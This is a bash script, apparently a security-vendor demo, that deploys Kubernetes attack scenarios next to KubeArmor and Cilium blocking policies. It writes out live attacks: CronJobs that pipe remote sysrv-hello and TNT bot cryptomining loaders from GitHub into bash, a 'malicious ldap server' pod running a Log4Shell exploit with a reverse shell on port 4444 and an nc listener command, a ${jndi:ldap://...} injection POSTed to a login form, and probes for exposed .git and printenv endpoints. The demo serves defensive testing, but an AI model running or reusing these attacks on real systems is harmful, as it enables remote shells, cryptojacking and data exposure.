#! /bin/bash
bold=`tput bold setaf 2`
reset=`tput sgr0`
red=`tput setaf 1`
#function to deploy tweeked boutique-app
boutique_deploy() {

	#storing namespace value to variable ns
	ns="boutique-app" 

	#create namespace
	#kubectl create ns $ns

	#check $ns is there or not
	if [[ -z $(kubectl get ns | grep $ns) ]]
	then
		echo "${bold}Creating $ns namespace. Please wait...${rest}"
  		kubectl create ns $ns
  		sleep 2
	else
		echo "${bold}Namespace $ns found${reset}"
	fi
	#check application is already deployed or not deployed
	status=$(kubectl get po -n $ns | grep -E 'frontend.*Running')
	if [[ -z $status ]]
	then
	
  		echo -e "${bold}\nSample appplication is deploying. Please wait...${reset}"
		s=$(kubectl apply -f https://raw.githubusercontent.com/accuknox/samples/main/microservice-demo/release/kubernetes-manifests.yaml -n $ns)
	else
		echo -e "${bold}\nApplication is already deployed in $ns namespace${reset}"
		kubectl get po -n $ns
	fi
	

	#Deploy sample application in $ns namespace
	#echo "${bold}Sample appplication is deploying in namespace... $ns ${reset}"
	#kubectl apply -f https://raw.githubusercontent.com/accuknox/samples/main/microservice-demo/release/kubernetes-manifests.yaml -n $ns

	#wait until service ip is ready
	while true
	do
   		if [[ -z $(kubectl get svc -n $ns | awk '{print $4}' | grep -i pending) ]]
   		then
      			break
   	fi
	done

	#store frontend external IP is varaible fip
	fip=$(kubectl -n $ns get service frontend-external | awk 'NR==2{print $4}')
	echo -e "\n${bold}URL of the application: http://$fip/ ${reset}"
	echo -e "\n${bold}Please make sure that all pods are in running state${reset}"

	#apply the policy to block git folder
	#goto http://$fip/static/.git/ to see the vulnerability
	echo -e "${bold}\nApplying KubeArmor policy to block exposure to Git folder...\nPolicy link https://raw.githubusercontent.com/accuknox/samples/main/microservice-demo/poc/ksp-sensitive-data-exposure-remediation.yaml ${reset}"
	kubectl apply -f https://raw.githubusercontent.com/accuknox/samples/main/microservice-demo/poc/ksp-sensitive-data-exposure-remediation.yaml -n $ns

	#apply the policy to block redis-exposure
	#goto http://$fip/cmd/printenv to see the vulnerability
	echo -e "${bold}\nApplying the policy to block all the binaries of frontend pod...\nPolicy link https://raw.githubusercontent.com/accuknox/samples/main/microservice-demo/poc/redis-data-exposure.yaml ${reset}"
	kubectl apply -f https://raw.githubusercontent.com/accuknox/samples/main/microservice-demo/poc/redis-data-exposure.yaml -n $ns
	echo ""
#Do the attack with a cron job
	cat <<EOF | kubectl apply -f -
apiVersion: batch/v1
kind: CronJob
metadata:
  name: redis-exposure-cron
  namespace: $ns
spec:
  schedule: "*/1 * * * *"
  successfulJobsHistoryLimit: 0
  failedJobsHistoryLimit: 0
  jobTemplate:
    spec:
      template:
        metadata:
          labels:
            container: curl
          annotations:
            kubearmor-policy: enabled
            kubearmor-visibility: process,file,network
        spec:
          containers:
          - name: curl
            image: alpine/curl
            imagePullPolicy: IfNotPresent
            command:
            - /bin/sh
            - -c
            - curl http://$fip/cmd/printenv
          restartPolicy: OnFailure
EOF
	echo -e "${bold}Cronjob created for accessing binary of the frontend pod in 1 min intervals\n${reset}"
	#Do the attack with a cron job
	cat <<EOF | kubectl apply -f -
apiVersion: batch/v1
kind: CronJob
metadata:
  name: sensitive-data-cron
  namespace: $ns
spec:
  schedule: "*/1 * * * *"
  successfulJobsHistoryLimit: 0
  failedJobsHistoryLimit: 0
  jobTemplate:
    spec:
      template:
        metadata:
          labels:
            container: curl
          annotations:
            kubearmor-policy: enabled
            kubearmor-visibility: process,file,network
        spec:
          containers:
          - name: curl
            image: alpine/curl
            imagePullPolicy: IfNotPresent
            command:
            - /bin/sh
            - -c
            - curl http://$fip/static/.git/
          restartPolicy: OnFailure
EOF
	echo -e "${bold}Cronjob created for accessing git folder of the frontend pod in 1 min intervals\n${reset}"

}
#remove boutique-app
boutique_remove() {

ns="boutique-app"
bold=`tput bold setaf 2`
reset=`tput sgr0`
if [[ -z $(kubectl get ns | grep $ns) ]]
	then
	
  		echo -e "${bold}\n$ns is not found${reset}"
  		
	else
		delete_boutique_app
		echo -e "\n${bold}Sample application deleted${reset}"
		echo -e "\n${bold}Removing KubeArmor Policies. Please wait...${reset}"
		delete_boutique_policies
		echo -e "\n${bold}Removing CronJob. Please wait..${reset}"
		delete_boutique_cron
		echo ""
		echo -e "\n${bold}Deleting $ns namespace. Please wait...${reset}"
		kubectl delete ns $ns
		echo -e "${bold}Successfully removed all components${reset}"
fi

}
delete_boutique_app() {

if [[ -z $(kubectl get po -n $ns | grep frontend-) ]]
	then
	
  		echo -e "${bold}\nSample application is not found in $ns namespace${reset}"
  		
	else
		echo -e  "\n${bold}Sample application deleting. Please wait...${reset}"
		s=$(kubectl delete -f https://raw.githubusercontent.com/accuknox/samples/main/microservice-demo/release/kubernetes-manifests.yaml -n $ns)
fi
}

delete_boutique_policies() {

if [[ -z $(kubectl get ksp -n $ns | grep block-bin-path) ]]
	then
	
  		echo "block-bin-path policy is not found in $ns namespace"
  		
	else
		#echo -e  "\n${bold}KubeArmor Policy block-bin-path deleting...${reset}"
		kubectl delete -f https://raw.githubusercontent.com/accuknox/samples/main/microservice-demo/poc/redis-data-exposure.yaml -n $ns
fi

if [[ -z $(kubectl get ksp -n $ns | grep sensitive-data-exposure-remediation) ]]
	then
	
  		echo "Sensitive-data-exposure-remediation policy is not found in $ns namespace"
  		
	else
		#echo -e  "\n${bold}sensitive-data-exposure-remediation policy deleting...${reset}"
		kubectl delete -f https://raw.githubusercontent.com/accuknox/samples/main/microservice-demo/poc/ksp-sensitive-data-exposure-remediation.yaml -n $ns
fi

}

delete_boutique_cron() {

if [[ -z $(kubectl get cj -n $ns | grep redis-exposure-cron) ]]
	then
	
  		echo "Cron job of redis exposure is not found in $ns namespace"
  		
	else
		#echo "Cron job of redis exposure deleting..."
		kubectl delete cj redis-exposure-cron -n $ns
fi

if [[ -z $(kubectl get cj -n $ns | grep sensitive-data-cron) ]]
	then
	
  		echo "Cron job of git folder exposure is not found in $ns namespace"
  		
	else
		#echo -e  "\n${bold}Cron job of git folder exposure deleting...${reset}"
		kubectl delete cj sensitive-data-cron -n $ns
fi

}

#function to deploy sysrv cryptomining malware and necessary components
sysrv_deploy() {

  ns_val="sysrv-poc"

  if [[ -z $(kubectl get ns | grep $ns_val) ]]
  then
      tput bold setaf 2; echo "Creating $ns_val namespace. Please wait..."
      kubectl create ns $ns_val
  fi

  echo 
  tput bold setaf 2; echo "Applying Security Policy. Please wait..."
  kubectl -n $ns_val apply -f https://raw.githubusercontent.com/accuknox/samples/main/sysrv-hello/ksp-block-sysrv-hello-malware.yaml 
  echo
  tput bold setaf 2; echo "Creating CronJob Please wait..."
  cat << eof | kubectl -n $ns_val apply -f-
apiVersion: batch/v1
kind: CronJob
metadata:
  name: cron-sysrv
spec:
  schedule: "*/2 * * * *"
  successfulJobsHistoryLimit: 0
  failedJobsHistoryLimit: 0
  jobTemplate:
    spec:
      template:
        metadata:
          labels:
           app: wordpress
        spec:
          containers:
          - name: wordpress
            image: knoxuser/wordpress
            imagePullPolicy: IfNotPresent
            command:
            - /bin/bash
            - -c 
            - curl -s https://raw.githubusercontent.com/accuknox/samples/main/sysrv-hello/ldr.sh | bash 
          restartPolicy: Never
eof


}


#function to remove all components deployed during installation phase
sysrv_remove() {

  ns_val="sysrv-poc"

  tput bold setaf 2; echo "Removing CronJob. Please wait.."
  echo
  cat << eof | kubectl -n $ns_val delete -f-
apiVersion: batch/v1
kind: CronJob
metadata:
  name: cron-sysrv
spec:
  schedule: "2 * * * *"
  successfulJobsHistoryLimit: 0
  failedJobsHistoryLimit: 0
  jobTemplate:
    spec:
      template:
        metadata:
          labels:
           app: wordpress
        spec:
          containers:
          - name: wordpress
            image: knoxuser/wordpress
            imagePullPolicy: IfNotPresent
            command:
            - /bin/bash
            - -c 
            - sleep 20; curl -s https://raw.githubusercontent.com/accuknox/samples/main/sysrv-hello/ldr.sh | bash 
          restartPolicy: Never
eof

  echo 
  tput bold setaf 2; echo "Removing Security Policy. Please wait..."
  kubectl -n $ns_val delete -f https://raw.githubusercontent.com/accuknox/samples/main/sysrv-hello/ksp-block-sysrv-hello-malware.yaml 

  echo
  tput bold setaf 2; echo "Deleting namespace '$ns_val'..."
  kubectl delete ns $ns_val
  echo

  echo
  tput bold setaf 2; echo "Successfully removed all components"
  echo
}

#function to deploy log4j and necessary components
log4j_deploy() {

  ns_val="java-ms-poc"

  if [[ -z $(kubectl get ns | grep $ns_val) ]]
  then
      tput bold setaf 2; echo "Creating $ns_val namespace. Please wait..."
      kubectl create ns $ns_val
  fi
  echo
  tput bold setaf 2; echo "Deploying a sample Java microservice on namespace '$ns_val'..."
  echo
  kubectl -n $ns_val apply -f https://raw.githubusercontent.com/accuknox/samples/main/log4j-demo/k8s.yaml
  sleep 2
  echo
  tput bold setaf 2; echo "Deploying malicious ldap server on namespace '$ns_val'..."
  echo
cat << eof | kubectl -n $ns_val apply -f-
apiVersion: apps/v1
kind: Deployment
metadata:
  labels:
    app: nc-pod
  name: nc-pod
spec:
  selector:
    matchLabels:
      app: nc-pod
  template:
    metadata:
      labels:
        app: nc-pod
    spec:
      containers:
      - name: nc-pod
        image: knoxuser/nc-pod
---
apiVersion: v1
kind: Service
metadata:
  labels:
    app: nc-pod
  name: nc-svc
spec:
  ports:
  - name: "4444"
    port: 4444
    protocol: TCP
    targetPort: 4444
  - name: "8000"
    port: 8000
    protocol: TCP
    targetPort: 8000
  - name: "1389"
    port: 1389
    protocol: TCP
    targetPort: 1389
  selector:
    app: nc-pod
  type: LoadBalancer
status:
  loadBalancer: {}
eof

  sleep 2
  echo
  echo "Waiting for pods to be ready."

#  while [[ "$(kubectl -n $ns_val get pods -l=app=nc-pod -o jsonpath='{.items[*].status.containerStatuses[0].ready}')" != "true" && "$(kubectl -n $ns_val get pods -l=app=java-ms -o jsonpath='{.items[*].status.containerStatuses[0].ready}')" != "true" ]]; do
#     sleep 5
#  done

  while true
  do
     if [[ -z $(kubectl get po -n $ns_val  | awk '{print $3}' | grep -i terminating) && -z $(kubectl get svc -n $ns_val | awk '{print $4}' | grep -i pending) && ! -z $(kubectl get po -n $ns_val  | awk '{print $3}' | grep -i running) && -z $(kubectl get po -n $ns_val  | awk '{print $3}' | grep -i containercreating) && -z $(kubectl get po -n $ns_val  | awk '{print $3}' | grep -i pending) && -z $(kubectl get po -n $ns_val  | awk '{print $3}' | grep -i err) && -z $(kubectl get po -n $ns_val  | awk '{print $3}' | grep -i terminating) ]]
     then
        break
     fi
  done

  ip=`kubectl get svc -n $ns_val | grep nc-svc | awk '{print $4}'`
  ip_val=`kubectl get svc -n $ns_val | grep java-ms-svc | awk '{print $4}'`
  echo
  tput bold setaf 2; echo "Making the ldap server up and running.."
  echo

  exec_function() {

    kubectl -n $ns_val exec -i $2 -- $1 2>&1
    echo
  }

  nc_function() {

    kubectl -n $ns_val exec -it $2 -- $1 
    echo
  }

  pod_name=$(kubectl -n $ns_val get po -lapp=nc-pod -o name | cut -d/ -f2)
  exec_function 'python3 poc.py --userip '$ip' --webport 8000 --lport 4444' $pod_name &

  sleep 30

  echo
  tput bold setaf 2; echo "Please use use the following command to listen to bind reverse shell"
  echo "kubectl -n $ns_val exec -it $pod_name -- nc -lvnp 4444"
  echo
  sleep 10

  echo 
  tput bold setaf 2; echo "Applying Security Policy. Please wait..."
  cat << eof | kubectl -n $ns_val apply -f-
apiVersion: "cilium.io/v2"
kind: CiliumNetworkPolicy
metadata:
  name: "log4j-rule-to-block-rmi-access"
spec:
  endpointSelector:
    matchLabels:
      app: java-ms
  egressDeny:
  - toEntities:
    - "world"
  - toPorts:
    - ports:
      - port: "1099"
      - port: "1389"
  egress:
    - toEntities:
      - "all"
    - toEndpoints:
      - matchLabels:
          "k8s:io.kubernetes.pod.namespace": kube-system
          "k8s:k8s-app": kube-dns
      toPorts:
        - ports:
           - port: "53"
             protocol: ANY
          rules:
            dns:
              - matchPattern: "*"

eof

  tput bold setaf 2; echo "Creating CronJob Please wait..."
  cat << eof | kubectl -n $ns_val apply -f-
apiVersion: batch/v1
kind: CronJob
metadata:
  name: cron-logj4
spec:
  schedule: "*/1 * * * *"
  successfulJobsHistoryLimit: 0
  failedJobsHistoryLimit: 0
  jobTemplate:
    spec:
      template:
        metadata:
          labels:
           app: java-ms
        spec:
          containers:
          - name: alpine-curl
            image: knoxuser/alpine-curl
            imagePullPolicy: IfNotPresent
            command:
            - /bin/sh
            - -c 
            - curl --connect-timeout 30 -no-keepalive --max-time 30 -d "uname=\\\${jndi:ldap://$ip:1389/a}&password=" -X POST http://$ip_val/login; exit 0
          restartPolicy: Never
eof


}


#function to remove all components deployed during installation phase
log4j_remove() {

  ns_val="java-ms-poc"

  tput bold setaf 2; echo "Removing CronJob. Please wait.."
  echo
  cat << eof | kubectl -n $ns_val delete -f-
apiVersion: batch/v1
kind: CronJob
metadata:
  name: cron-logj4
spec:
  schedule: "*/1 * * * *"
  successfulJobsHistoryLimit: 0
  failedJobsHistoryLimit: 0
  jobTemplate:
    spec:
      template:
        metadata:
          labels:
           app: java-ms
        spec:
          containers:
          - name: alpine-curl
            image: knoxuser/alpine-curl
            imagePullPolicy: IfNotPresent
            command:
            - /bin/sh
            - -c
            - curl --connect-timeout 30 -no-keepalive --max-time 30 -d "uname=\\\${jndi:ldap://$ip:1389/a}&password=" -X POST http://$ip_val/login; exit 0
          restartPolicy: Never
eof

  echo
  tput bold setaf 2; echo "Removing malicious ldap server from namespace '$ns_val'..."
  echo
  cat << eof | kubectl -n $ns_val delete -f-
apiVersion: apps/v1
kind: Deployment
metadata:
  labels:
    app: nc-pod
  name: nc-pod
spec:
  selector:
    matchLabels:
      app: nc-pod
  template:
    metadata:
      labels:
        app: nc-pod
    spec:
      containers:
      - name: nc-pod
        image: knoxuser/nc-pod
---
apiVersion: v1
kind: Service
metadata:
  labels:
    app: nc-pod
  name: nc-svc
spec:
  ports:
  - name: "4444"
    port: 4444
    protocol: TCP
    targetPort: 4444
  - name: "8000"
    port: 8000
    protocol: TCP
    targetPort: 8000
  - name: "1389"
    port: 1389
    protocol: TCP
    targetPort: 1389
  selector:
    app: nc-pod
  type: LoadBalancer
status:
  loadBalancer: {}

eof

  echo
  tput bold setaf 2; echo "Removing sample Java microservice from namespace '$ns_val'..."
  echo
  kubectl -n $ns_val delete -f https://raw.githubusercontent.com/accuknox/samples/main/log4j-demo/k8s.yaml
  sleep 2

  echo 
  tput bold setaf 2; echo "Removing Security Policy. Please wait..."
  cat << eof | kubectl -n $ns_val delete -f-
apiVersion: "cilium.io/v2"
kind: CiliumNetworkPolicy
metadata:
  name: "log4j-rule-to-block-rmi-access"
spec:
  endpointSelector:
    matchLabels:
      app: java-ms
  egressDeny:
  - toEntities:
    - "world"
  - toPorts:
    - ports:
      - port: "1099"
      - port: "1389"
  egress:
    - toEntities:
      - "all"
    - toEndpoints:
      - matchLabels:
          "k8s:io.kubernetes.pod.namespace": kube-system
          "k8s:k8s-app": kube-dns
      toPorts:
        - ports:
           - port: "53"
             protocol: ANY
          rules:
            dns:
              - matchPattern: "*"

eof

  echo
  tput bold setaf 2; echo "Deleting namespace '$ns_val'..."
  kubectl delete ns $ns_val
  echo

  echo
  tput bold setaf 2; echo "Successfully removed all components"
  echo
}

#function to deploy tntbot and necessary components
tntbot_deploy() {

  ns_val="wordpress-poc"

  if [[ -z $(kubectl get ns | grep $ns_val) ]]
  then
      tput bold setaf 2; echo "Creating $ns_val namespace. Please wait..."
      kubectl create ns $ns_val
  fi

  echo 
  tput bold setaf 2; echo "Applying Security Policy. Please wait..."
  #kubectl -n $ns_val apply -f https://raw.githubusercontent.com/accuknox/samples/main/tntbot/cnp-block-tnt_botinger.yaml
  kubectl -n $ns_val apply -f https://raw.githubusercontent.com/accuknox/samples/main/tntbot/ksp-block-tnt-botinger.yaml
  echo
  tput bold setaf 2; echo "Creating CronJob Please wait..."
  cat << eof | kubectl -n $ns_val apply -f-
apiVersion: batch/v1
kind: CronJob
metadata:
  name: cron-tntbot
spec:
  schedule: "*/1 * * * *"
  successfulJobsHistoryLimit: 0
  failedJobsHistoryLimit: 0
  jobTemplate:
    spec:
      template:
        metadata:
          labels:
           app: wordpress-poc
        spec:
          containers:
          - name: wordpress
            image: knoxuser/wordpress
            imagePullPolicy: IfNotPresent
            command:
            - /bin/bash
            - -c 
            - curl -s https://raw.githubusercontent.com/accuknox/samples/main/tntbot/Bot | bash 
          restartPolicy: Never
eof


}


#function to remove all components deployed during installation phase
tntbot_remove() {

  ns_val="wordpress-poc"

  tput bold setaf 2; echo "Removing CronJob. Please wait.."
  echo
  cat << eof | kubectl -n $ns_val delete -f-
apiVersion: batch/v1
kind: CronJob
metadata:
  name: cron-tntbot
spec:
  schedule: "1 * * * *"
  successfulJobsHistoryLimit: 0
  failedJobsHistoryLimit: 0
  jobTemplate:
    spec:
      template:
        metadata:
          labels:
           app: wordpress-poc
        spec:
          containers:
          - name: wordpress
            image: knoxuser/wordpress
            imagePullPolicy: IfNotPresent
            command:
            - /bin/bash
            - -c 
            - sleep 20; curl -s https://raw.githubusercontent.com/accuknox/samples/main/tntbot/Bot | bash 
          restartPolicy: Never
eof

  echo 
  tput bold setaf 2; echo "Removing Security Policy. Please wait..."
  kubectl -n $ns_val delete -f https://raw.githubusercontent.com/accuknox/samples/main/tntbot/cnp-block-tnt_botinger.yaml
  kubectl -n $ns_val delete -f https://raw.githubusercontent.com/accuknox/samples/main/tntbot/ksp-block-tnt-botinger.yaml

  echo
  tput bold setaf 2; echo "Deleting namespace '$ns_val'..."
  kubectl delete ns $ns_val
  echo

  echo
  tput bold setaf 2; echo "Successfully removed all components"
  echo
}

if [[ ( $1 == "boutique" ) && ( $2 == "" ) ]]
then
  boutique_deploy
  
elif [[ ( $1 == "sysrv" ) && ( $2 == "" ) ]]
then

  sysrv_deploy

elif [[ ( $1 == "log4j" ) && ( $2 == "" ) ]]
then

  log4j_deploy

elif [[ ( $1 == "tntbot" ) && ( $2 == "" ) ]]
then

  tntbot_deploy
  
elif [[ ( $1 == "all" ) && ( $2 == "" ) ]]
then
  echo -e "\n${bold}-------------------------------------------------------\nDeploying boutique-app Scenrio${reset}"
  boutique_deploy
  echo -e "\n${bold}-------------------------------------------------------\nDeploying sysrv-hello cryptomining scenario${reset}"
  sysrv_deploy
  echo -e "\n${bold}-------------------------------------------------------\nDeploying log4j scenario${reset}"
  log4j_deploy
  
elif [[ ( $1 == "boutique" ) && ( $2 == "del" ) ]]
then
  
  boutique_remove
  
elif [[ ( $1 == "sysrv") && ( $2 == "del" ) ]]
then
  
  sysrv_remove

elif [[ ( $1 == "log4j") && ( $2 == "del" ) ]]
then
  
  log4j_remove
  
elif [[ ( $1 == "tntbot") && ( $2 == "del" ) ]]
then
  
  tntbot_remove

elif [[ ( $1 == "all") && ( $2 == "del" ) ]]
then
  echo -e "\n${bold}-------------------------------------------------------\nDeleting boutique-app scenrio${reset}"
  boutique_remove
  echo -e "\n${bold}-------------------------------------------------------\nDeleting sysrv-hello cryptomining scenrio${reset}"
  sysrv_remove
  echo -e "\n${bold}-------------------------------------------------------\nDeleting log4j scenrio${reset}"
  log4j_remove
  echo -e "\n${bold}-------------------------------------------------------\nDeleting tnt-botinger cryptomining scenrio${reset}"
  tntbot_remove
else

  echo -e "${bold}Use following commands for deploying and deleting. \n$0 boutique/sysrv/log4j/tntbot/all ---> to deploy\n$0 boutique/sysrv/log4j/tntbot/all del ---> to delete\nExample:- bash attack.sh boutique or bash attack.sh boutique del${reset}"
fi
